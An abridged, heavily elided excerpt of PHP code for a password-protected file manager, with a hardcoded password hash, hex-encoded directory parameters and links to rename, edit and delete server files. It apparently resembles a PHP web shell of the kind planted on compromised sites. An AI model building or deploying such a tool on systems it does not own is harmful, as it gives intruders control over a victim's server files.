...
$passwordHash = "3ef23c2a864e93567105f44b8cb0d71f";
...
if ($_GET['r']) {
    ...
    ?>
        <form method="POST">
            <input type="text" name="new_name" value="<?= basename($file) ?>">
    ...
    <table>
        ...
        <tbody>
            ...
            foreach ($files as $file) {
                ...
                echo '<td>';
                if (is_file("$dir/$file")) {
                    echo '<a href="?dr=' . h2b($dir) . '&fp=' . $href . '&r=1" class="td">RENAME</a> | <a href="?dr=' . h2b($dir) . '&fp=' . $href . '&e=1" class="td">EDIT</a> | <a href="?dr=' . h2b($dir) . '&fp=' . $href . '&d=1" class="td">DELETE</a>';
                } else {
